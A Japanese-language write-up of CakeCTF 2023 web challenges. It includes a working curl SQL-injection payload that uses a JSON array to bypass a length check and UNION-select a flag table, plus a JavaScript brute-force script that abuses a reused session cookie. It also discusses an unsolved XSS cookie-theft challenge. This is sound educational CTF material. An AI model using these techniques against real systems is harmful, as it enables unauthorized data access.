---
title: CakeCTF 2023 Writeup
date: 2023-11-12
layout: writeup
rank: 99
total_teams: 729
language: ja
tags:
  - Web
---

# はじめに

SECCON Beginners 福岡に参加してCTFのモチベが上がったのでCakeCTF 2023に参加してきました。チームkanimisoとして2人で参加し、99位/729チームでした。
![](/assets/img/cakectf_2023/cf744e339150-20231112.png)

# WriteUp

チームメイトがpwn/revを得意としていたのでcrypto/webを解く予定でしたが、cryptoのwarmupで楕円曲線暗号が出てきて即離脱、結局ずっとwebをガチャガチャやっていました。

- Welcome
- Survey
- Country DB
- TOWFL
- AdBlog

## Welcome (673 solves)

開始と同時にDiscordのannouncementチャンネルでFlagが公開されました。
`CakeCTF{hav3_s0m3_cak3_t0_r3fr3sh_y0ur_pa1at3}`

## Survey (208 solves)

アンケートに答えるとFlagが表示されました。
`CakeCTF{thank_y0u_4_tasting_0ur_n3w_cak3s_this_y3ar}`

## Country DB (246 solves)

アルファベット2文字の国名コードを表示すると国旗と国名が表示されるwebアプリで、国のデータとは別のテーブルに保存されているFlagをどうにかして取得する問題。
ソースコードとDBの内容は以下の通り。

```py
#!/usr/bin/env python3
import flask
import sqlite3

app = flask.Flask(__name__)

def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
        found = cur.fetchone()
    return None if found is None else found[0]

@app.route('/')
def index():
    return flask.render_template("index.html")

@app.route('/api/search', methods=['POST'])
def api_search():
    req = flask.request.get_json()
    if 'code' not in req:
        flask.abort(400, "Empty country code")

    code = req['code']
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")

    name = db_search(code)
    if name is None:
        flask.abort(404, "No such country")

    return {'name': name}

if __name__ == '__main__':
    app.run(debug=True)
```

```py
import sqlite3
import os

FLAG = os.getenv("FLAG", "FakeCTF{*** REDACTED ***}")

conn = sqlite3.connect("database.db")
conn.execute("""CREATE TABLE country (
  code TEXT NOT NULL,
  name TEXT NOT NULL
);""")
conn.execute("""CREATE TABLE flag (
  flag TEXT NOT NULL
);""")
conn.execute(f"INSERT INTO flag VALUES (?)", (FLAG,))

# Country list from https://gist.github.com/vxnick/380904
countries = [
    ('AF', 'Afghanistan'),
    ('AX', 'Aland Islands'),
    # ...(略)...
    ('ZM', 'Zambia'),
    ('ZW', 'Zimbabwe'),
]
conn.executemany("INSERT INTO country VALUES (?, ?)", countries)

conn.commit()
conn.close()
```

注目すべきはここで、もうこんなのSQLiしてくれって言ってるようなものじゃないですか。

```py
        cur.execute(f"SELECT name FROM country WHERE code=UPPER('{code}')")
```

ただ一筋縄ではいかなくて、

```py
    if len(code) != 2 or "'" in code:
        flask.abort(400, "Invalid country code")
```

という制約が課せられています。

- でも別に文字列じゃなくても長さが2になれば良さそう → 配列を代入してみる
- SQL文を実行するときには`"`が`'`に置き換えられる → `'`の代わりに`"`を使う

という方針を立ててリクエストを送ってみるとFlagが取得できました。問題のクライアントのtextboxには二文字までしか入力できないようなので、curlで直接サーバーを叩いてあげましょう。

```sh
curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"code": [") UNION ALL SELECT flag FROM flag --",""]}' \
  http://countrydb.2023.cakectf.com:8020/api/search
```

Flagは`CakeCTF{b3_c4refUl_wh3n_y0U_u5e_JS0N_1nPut}`でした。

## TOWFL (171 solves)

謎言語のリーディング問題を100問出題され、すべて正答ならFlagが表示されるという問題。
とりあえず適当に触って開発者ツールを確認すると、最初に`api/start`を叩いてリセットし、sessionで管理しているっぽい感じ。
![](/assets/img/cakectf_2023/6d54395bffd5-20231112.png)
ソースコードは以下の通りで、sessionごとに正解もランダムで生成されるらしい。

```py
#!/usr/bin/env python3
import flask
import json
import lorem
import os
import random
import redis

REDIS_HOST = os.getenv("REDIS_HOST", "redis")
REDIS_PORT = int(os.getenv("REDIS_PORT", "6379"))

app = flask.Flask(__name__)
app.secret_key = os.urandom(16)

@app.route("/")
def index():
    return flask.render_template("index.html")

@app.route("/api/start", methods=['POST'])
def api_start():
    if 'eid' in flask.session:
        eid = flask.session['eid']
    else:
        eid = flask.session['eid'] = os.urandom(32).hex()

    # Create new challenge set
    db().set(eid, json.dumps([new_challenge() for _ in range(10)]))
    return {'status': 'ok'}

@app.route("/api/question/<int:qid>", methods=['GET'])
def api_get_question(qid: int):
    if qid <= 0 or qid > 10:
        return {'status': 'error', 'reason': 'Invalid parameter.'}
    elif 'eid' not in flask.session:
        return {'status': 'error', 'reason': 'Exam has not started yet.'}

    # Send challenge information without answers
    chall = json.loads(db().get(flask.session['eid']))[qid-1]
    del chall['answers']
    del chall['results']
    return {'status': 'ok', 'data': chall}

@app.route("/api/submit", methods=['POST'])
def api_submit():
    if 'eid' not in flask.session:
        return {'status': 'error', 'reason': 'Exam has not started yet.'}

    try:
        answers = flask.request.get_json()
    except:
        return {'status': 'error', 'reason': 'Invalid request.'}

    # Get answers
    eid = flask.session['eid']
    challs = json.loads(db().get(eid))
    if not isinstance(answers, list) \
       or len(answers) != len(challs):
        return {'status': 'error', 'reason': 'Invalid request.'}

    # Check answers
    for i in range(len(answers)):
        if not isinstance(answers[i], list) \
           or len(answers[i]) != len(challs[i]['answers']):
            return {'status': 'error', 'reason': 'Invalid request.'}

        for j in range(len(answers[i])):
            challs[i]['results'][j] = answers[i][j] == challs[i]['answers'][j]

    # Store information with results
    db().set(eid, json.dumps(challs))
    return {'status': 'ok'}

@app.route("/api/score", methods=['GET'])
def api_score():
    if 'eid' not in flask.session:
        return {'status': 'error', 'reason': 'Exam has not started yet.'}

    # Calculate score
    challs = json.loads(db().get(flask.session['eid']))
    score = 0
    for chall in challs:
        for result in chall['results']:
            if result is True:
                score += 1

    # Is he/she worth giving the flag?
    if score == 100:
        flag = os.getenv("FLAG")
    else:
        flag = "Get perfect score for flag"

    # Prevent reply attack
    flask.session.clear()

    return {'status': 'ok', 'data': {'score': score, 'flag': flag}}


def new_challenge():
    """Create new questions for a passage"""
    p = '\n'.join([lorem.paragraph() for _ in range(random.randint(5, 15))])
    qs, ans, res = [], [], []
    for _ in range(10):
        q = lorem.sentence().replace(".", "?")
        op = [lorem.sentence() for _ in range(4)]
        qs.append({'question': q, 'options': op})
        ans.append(random.randrange(0, 4))
        res.append(False)
    return {'passage': p, 'questions': qs, 'answers': ans, 'results': res}

def db():
    """Get connection to DB"""
    if getattr(flask.g, '_redis', None) is None:
        flask.g._redis = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, db=0)
    return flask.g._redis

if __name__ == '__main__':
    app.run()
```

パッと見た感じ解答のリーク等も無く、総当たりしかなさそうな雰囲気がします。
ただsessionの破棄がどこでも行われていないので、sessionさえ正しいものなら何回でも答えの検証ができます。ということで、sessionを固定して1問ずつ順番に総当たりするコードを書きました。

```js
let answer = [
  [null, null, null, null, null, null, null, null, null, null],
  [null, null, null, null, null, null, null, null, null, null],
  [null, null, null, null, null, null, null, null, null, null],
  [null, null, null, null, null, null, null, null, null, null],
  [null, null, null, null, null, null, null, null, null, null],
  [null, null, null, null, null, null, null, null, null, null],
  [null, null, null, null, null, null, null, null, null, null],
  [null, null, null, null, null, null, null, null, null, null],
  [null, null, null, null, null, null, null, null, null, null],
  [null, null, null, null, null, null, null, null, null, null],
]

const getSession = async () => {
  let res = await fetch('http://towfl.2023.cakectf.com:8888/api/start', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    }
  })
  return res.headers.get('set-cookie').split(';')[0]
}

const submitAnswer = async (session) => {
  let res = await fetch('http://towfl.2023.cakectf.com:8888/api/submit', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Cookie': session,
    },
    body: JSON.stringify(answer)
  })
}

const getScore = async (session) => {
  await submitAnswer(session)
  let res = await fetch('http://towfl.2023.cakectf.com:8888/api/score', {
    method: 'GET',
    headers: {
      'Content-Type': 'application/json',
      'Cookie': session,
    }
  })
  return await res.json()
}

const solver = async () => {
  let session = await getSession()
  let score = 0
  for (let i = 0; i < 10; i++) {
    for (let j = 0; j < 10; j++) {
      for (let ans = 0; ans < 4; ans++) {
        answer[i][j] = ans
        let res = await getScore(session)
        if (res.data.score === 100) {
          console.log(res.data.flag)
          return
        }
        else if (score < res.data.score) {
          console.log(res.data)
          score++
          break
        }
      }
    }
  }
}

solver()
```

少し時間がかかりますが、無事Flagが取得できました。
`CakeCTF{b3_c4ut10us_1f_s3ss10n_1s_cl13nt_s1d3_0r_s3rv3r_s1d3}`

## AdBlog (39 solves)

解けませんでした。
ブログの投稿と閲覧ができるwebアプリ、管理者への通報ページのようなwebアプリ、その通報されたページを巡回するwebクローラーがあり、クローラーが巡回する際にFlagを仕込んだCookieを置いていくという問題。
ブログ投稿画面にご丁寧にもHTMLとあり、クローラーでセットしているCookieはhttpOnlyもsecureもどちらもfalseになっているという、XSSしてくれと言わんばかりの問題。
![](/assets/img/cakectf_2023/9d58c0ddd400-20231112.png)

```js
        await page.setCookie({
            name: 'flag',
            value: flag,
            domain: new URL(base_url).hostname,
            httpOnly: false,
            secure: false
        });
```

しかしブログ表示の方が厄介で、base64でのエンコードを挟み、さらに`DOMPurify.sanitize()`にかけるという。

```js
     let content = DOMPurify.sanitize(atob("{{ content }}"));
     document.getElementById("content").innerHTML = content;
```

記事タイトルの方でインジェクションしようにもこちらはFlaskのJinja2がエスケープしているので手詰まり。もしかしてそもそもXSSがミスリードだったりするのかなぁって……流石にそんなことないと思いたいですけど。

## おわりに

正直1問も解けない覚悟もしていたので、2問解けたのは素直に嬉しいです。web以外も少し触ったんですがそっちは全く歯が立たなかったので鍛錬が必要ですね。CakeCTFのrevはwarmupでもC言語以外だったりELFファイルじゃなかったりで初心者視点だとかなり癖のある問題が多いという印象があるので、解けるようになりたいです。
最近コードも書かず技術も触らずな怠惰な生活でしたが、このCTFで適度な無力感と焦燥感をもらったのでしばらく頑張れそうです。それでは。
